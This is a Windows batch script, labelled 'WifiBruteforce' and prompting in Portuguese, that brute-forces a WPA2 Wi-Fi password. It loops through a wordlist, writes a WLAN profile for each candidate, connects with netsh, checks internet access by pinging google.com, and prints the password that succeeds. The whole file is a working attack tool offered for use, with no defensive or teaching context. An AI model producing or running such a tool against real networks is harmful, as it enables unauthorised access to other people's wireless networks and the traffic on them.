@ECHO off
ECHO +----------------------------+
ECHO ^| WifiBruteforce (by Sql3t0) ^|
ECHO +----------------------------+ 

SET SENHA=None
SET /p nome=Entre com o Nome do Ponto de Acesso (Ex: VIVO-F102): 
SET /p lista=Entre com o nome da lista de SENHAS que sera usada (Ex: datas.txt ): 
ECHO .
ECHO                       INFORMACOES
ECHO  --------------------------------------------------------------------------------
ECHO   SSID: %nome% ^| WORDLIST: %lista% 
ECHO .


FOR /F %%s IN (%lista%) do (

	SET SENHA=%%s
	ECHO [.] --------------------------------------
	ECHO [^>] TESTANDO SENHA : %%s
	
	REM WPA/PSK xml file type 
	ECHO ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^> ^<name^>%nome%^</name^> ^<SSIDConfig^> ^<SSID^> ^<name^>%nome%^</name^> ^</SSID^> ^</SSIDConfig^> ^<connectionType^>ESS^</connectionType^> ^<connectionMode^>auto^</connectionMode^> ^<MSM^> ^<security^> ^<authEncryption^> ^<authentication^>WPA2PSK^</authentication^> ^<encryption^>AES^</encryption^> ^<useOneX^>false^</useOneX^> ^</authEncryption^> ^<sharedKey^> ^<keyType^>passPhrase^</keyType^> ^<protected^>false^</protected^> ^<keyMaterial^> %%s ^</keyMaterial^> ^</sharedKey^> ^</security^> ^</MSM^> ^</WLANProfile^> > %nome%.xml
	
	ECHO [^>] Desconectando rede...
	REM netsh wlan disconnect > NULL
	netsh wlan disconnect
	
	ECHO [^>] Adicionando novo PROFILE : %nome% 
	REM netsh wlan add profile filename=%nome%.xml user=all
	netsh wlan add profile filename=%nome%.xml user=all > NULL

	ECHO [^>] Conectando com a REDE : %nome%
	REM netsh wlan connect ssid=%nome% name=%nome%
	netsh wlan connect ssid=%nome% name=%nome% > NULL
	
	ECHO [^>] TESTANDO CONEXAO...
	for /L %%p in (0,1,10) do (  
		REM ping google.com 
		ping -n 2 google.com 2> NULL | FIND "Resposta de"
		if not errorlevel 1 goto senhaOK
	)
)

netsh wlan delete profile name=%nome% 2> NULL
DEL %nome%.xml
DEL NULL
SET nome=
SET compS=
SET lista=
SET SENHA=
ECHO [-] Nenhuma senha encontrada !
GOTO ECHOON

REM Mostra somente se senha encontrada com sucesso.
:senhaOK
netsh wlan delete profile name=%nome%
DEL %nome%.xml
DEL NULL
ECHO [+] Senha Encontrada com Sucesso !
ECHO                       INFORMACOES
ECHO  --------------------------------------------------------------------------------
ECHO   SSID: %nome% ^| WORDLIST: %lista% ^| SENHA: %SENHA%                 
SET nome=
SET lista=
SET SENHA=
GOTO ECHOON

:ECHOON
ECHO  --------------------------------------------------------------------------------
ECHO [.] Fim !

@ECHO on
